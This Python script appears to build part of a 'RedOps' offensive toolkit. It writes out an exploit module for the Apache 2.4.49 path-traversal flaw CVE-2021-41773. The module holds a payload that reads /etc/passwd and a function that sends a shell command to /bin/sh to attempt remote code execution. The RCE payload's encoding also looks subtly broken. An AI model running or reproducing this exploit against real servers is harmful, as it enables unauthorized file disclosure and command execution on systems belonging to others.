from pathlib import Path

project_root = Path(__file__).resolve().parent.parent
exploit_dir = project_root / "RedOps" / "Core" / "exploits"
exploit_dir.mkdir(parents=True, exist_ok=True)

# Apache CVE-2021-41773
apache_exploit_code = """
import requests

def check_apache_path_traversal(target):
    if not target.startswith("http"):
        target = "http://" + target

    print(f"[+] Checking Apache 2.4.49 path traversal on {target}")
    payload = "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
    try:
        r = requests.get(target + payload, timeout=5)
        if "root:x:" in r.text:
            print("[!!!] Target is vulnerable to CVE-2021-41773 (Path Traversal)")
            return True
    except Exception as e:
        print(f"[!] Error checking: {e}")
    return False

def attempt_rce(target):
    print("[+] Attempting RCE via path traversal...")
    cmd = "id"
    payload = f"/cgi-bin/.%%2e/%%2e%%2e/%%2e%%2e/%%2e%%2e/bin/sh"
    data = f"echo Content-Type: text/plain; echo; {cmd}"
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    try:
        r = requests.post(target + payload, data=data, headers=headers, timeout=5)
        print("[*] RCE Output:")
        print(r.text)
    except Exception as e:
        print(f"[!] RCE failed: {e}")
"""

apache_exploit_path = exploit_dir / "apache_path_traversal.py"
apache_exploit_path.write_text(apache_exploit_code.strip(), encoding="utf-8")

init_file = exploit_dir / "__init__.py"
init_file.write_text("", encoding="utf-8")

print(f"[âœ”] Apache exploit module created at: {apache_exploit_path.relative_to(project_root)}")